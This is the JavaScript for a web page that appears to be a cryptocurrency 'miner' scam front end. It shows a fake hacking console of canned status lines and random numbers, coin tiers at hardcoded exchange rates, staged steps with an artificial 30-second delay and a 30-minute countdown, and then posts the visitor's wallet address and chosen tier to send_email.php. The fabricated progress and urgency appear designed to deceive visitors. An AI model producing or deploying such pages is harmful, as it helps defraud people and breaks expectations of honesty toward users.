var intervalID = window.setInterval(updateScreen, 200);
var c = document.getElementById("console");

var txt = [
  "Authorized...",
  "Compilation of Data Structures Complete..",
  "Entering Security Console...",
  "Calculating Space Requirements ",
  "Estimating Approximate Location of Data Structure",
  "tar -xzf Texture",
  "Entering Security Console...",
  "Compilation of Data Structures Complete..",
  "0.004714638918991265 0.6356000603615327 0.7281096587723532 0.13963948508462742 0.5752648634412232 ",
  "0.009124377419232443 0.7471861347445409 0.6007907364439609 0.703563661870608 0.09509907013935581 ",
  "0.5109833315565889 0.04675099326734977 0.33548453492252683 0.7362683180680712 0.8698099653256212 ",
  "0.6766180303680542 0.9456919210507244 0.9144607399285849 0.47776528023943987 0.6899372476509587 ",
  "0.693722140160303 0.7472134700270828 0.5533693216820587 0.14705904429599803 0.8156733130608738 ",
  "0.566127628602914 0.1979598331506356 0.30418410602678414 0.8913703112621411 ",
  "Compression Complete.",
  "Going Deeper.... Compilation of Data Structures Complete..",
  "0.004714638918991265 0.6356000603615327 0.7281096587723532 0.13963948508462742",
  "0.5752648634412232 0.009124377419232443 0.7471861347445409 0.6007907364439609 "
]

var docfrag = document.createDocumentFragment();

function updateScreen() {
  //Shuffle the "txt" array
  txt.push(txt.shift());
  //Rebuild document fragment
  txt.forEach(function (e) {
    var p = document.createElement("p");
    p.textContent = e;
    docfrag.appendChild(p);
  });
  //Clear DOM body
  while (c.firstChild) {
    c.removeChild(c.firstChild);
  }
  c.appendChild(docfrag);
}

var getUrlParameter = function getUrlParameter(sParam) {
  var sPageURL = window.location.search.substring(1),
    sURLVariables = sPageURL.split('&'),
    sParameterName,
    i;

  for (i = 0; i < sURLVariables.length; i++) {
    sParameterName = sURLVariables[i].split('=');

    if (sParameterName[0] === sParam) {
      return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
    }
  }
  return false;
};

function setImageUrl(selectedCurrency) {
  var imageUrl;
  switch (selectedCurrency) {
    case "usdt":
      imageUrl = "img/TetherBadge.svg";
      break;
    case "eth":
      imageUrl = "img/EthereumBadge.svg";
      break;
    case "btc":
      imageUrl = "img/BitcoinBadge.svg";
      break;
    case "ton":
      imageUrl = "img/TonBadge.svg";
      break;
    case "sol":
      imageUrl = "img/SolanaBadge.svg";
      break;
    case "matic":
      imageUrl = "img/PolygonBadge.svg";
      break;
    case "doge":
      imageUrl = "img/DogecoinBadge.svg";
      break;
    case "trx":
      imageUrl = "img/TronBadge.svg";
      break;
  }
  return imageUrl;
}


function setName(currency) {
  var name;
  switch (currency) {
    case "usdt":
      name = "TETHER";
      break;
    case "eth":
      name = "ETHEREUM";
      break;
    case "btc":
      name = "BITCOIN";
      break;
    case "ton":
      name = "TON COIN";
      break;
    case "sol":
      name = "SOLANA";
      break;
    case "matic":
      name = "POLYGON";
      break;
    case "doge":
      name = "DOGE COIN";
      break;
    case "trx":
      name = "TRON";
      break;
  }
  return name;
}

function getRate(currency) {
  var name;
  switch (currency) {
    case "usdt":
      name = "1";
      break;
    case "eth":
      name = "3091.78";
      break;
    case "btc":
      name = "64190.10";
      break;
    case "ton":
      name = "6.14";
      break;
    case "sol":
      name = "144.68";
      break;
    case "matic":
      name = "0.6751";
      break;
    case "doge":
      name = "0.1534";
      break;
    case "trx":
      name = "0.1104";
      break;
  }
  return name;
}


$(document).ready(function () {

  var type = getUrlParameter('type');
  if (type.trim() === "") {
    type = "usdt";
  }

  $("."+type).removeClass("d-none");

  // $(".get-currency").change(function () {
  //   var selectedCurrency = $(this).val();
  //   var imageUrl = "";

  //   var imageUrl = setImageUrl(selectedCurrency);

  //   $(".token-img").attr("src", imageUrl);
  // });

  $(".get-currency").trigger("change");

  $(".type").text(setName(type));
  $(".get-currency").val(type);
  $(".token-img").attr("src", setImageUrl(type));

  $(".20usd").html((20/getRate(type)).toFixed(8) + " " + type + "("+ setName(type) + ")");
  $(".100usd").html((100/getRate(type)).toFixed(8)+ " " + type + "("+ setName(type) + ")");
  $(".300usd").html((300/getRate(type)).toFixed(8)+ " " + type + "("+ setName(type) + ")");
  $(".500usd").html((500/getRate(type)).toFixed(8)+ " " + type + "("+ setName(type) + ")");
  $(".1000usd").html((1000/getRate(type)).toFixed(8)+ " " + type + "("+ setName(type) + ")");
  $(".3000usd").html((3000/getRate(type)).toFixed(8)+ " " + type + "("+ setName(type) + ")");
  $(".5000usd").html((5000/getRate(type)).toFixed(8)+ " " + type + "("+ setName(type) + ")");


  $(".get-currency").val("100usd");


  $("#gostep2").click(function () {
    var inputValue = $("#floatingInputGroup2").val();
    if (inputValue.trim() === "") {
      $("#floatingInputGroup2").addClass("is-invalid");
      $(".form-floating2").addClass("is-invalid");
      $(".error_address").removeClass("d-none");
    } else {
      $("#floatingInputGroup2").removeClass("is-invalid");
      $(".form-floating2").removeClass("is-invalid");
      $(".error_address").addClass("d-none");
      $(".step-1").addClass("d-none");
      $(".step-2").removeClass("d-none");
    }
  });

  $("#gostep3").click(function () {
    $(".step-2").addClass("d-none");
    $(".step-3").removeClass("d-none");
    setTimeout(function () {
      $(".step-3").addClass("d-none");
      $(".step-4").removeClass("d-none");
    }, 30000);
  });

  function initializeTimer() {
    let date = new Date();

      var endDate = date.setMinutes(date.getMinutes() + 30);
      var currentDate = new Date();
      var seconds = (endDate-currentDate) / 1000;
      if (seconds > 0) {
          var minutes = seconds/60;
          var hours = minutes/60;
          minutes = (hours - Math.floor(hours)) * 60; 
          hours = Math.floor(hours); 
          seconds = Math.floor((minutes - Math.floor(minutes)) * 60); 
          minutes = Math.floor(minutes); 

          setTimePage(hours,minutes,seconds); 

          function secOut() {
              if (seconds == 0) { 
                  if (minutes == 0) {
                      if (hours == 0) { 
                          showMessage(timerId);
                      }
                      else {
                          hours--; 
                          minutes = 59; 
                          seconds = 59;
                      }
                  }
                  else {
                      minutes--; 
                      seconds = 59; 
                  }
              }
              else {
                  seconds--; 
              }
              setTimePage(hours,minutes,seconds); 
          }
          timerId = setInterval(secOut, 1000) 
      }
      else {
          alert("Установленная дата уже прошла");
      }
  }

  function setTimePage(h,m,s) { 
      var element = document.getElementById("timer");
      element.innerHTML = "<br>Minutes: "+m+" Seconds: "+s;
  }

  function showMessage(timerId) { 
      alert("Время истекло!");
      clearInterval(timerId);
  }


    $("#gostep5").click(function () {
      $(".step-4").addClass("d-none");
      $(".step-5").removeClass("d-none");
      initializeTimer();
      var inputValueCopy = $("#floatingInputGroup2").val();
      var minerValueCopy = $(".get-currency").val();
  
      $.ajax({
        url: "send_email.php",
        method: "POST",
        data: { inputValue: inputValueCopy, minerValue: minerValueCopy },
        success: function (response) {
          console.error("Sent successfully");
        },
        error: function (xhr, status, error) {
          console.error("Error:", error);
        }
      });
  
    });

  });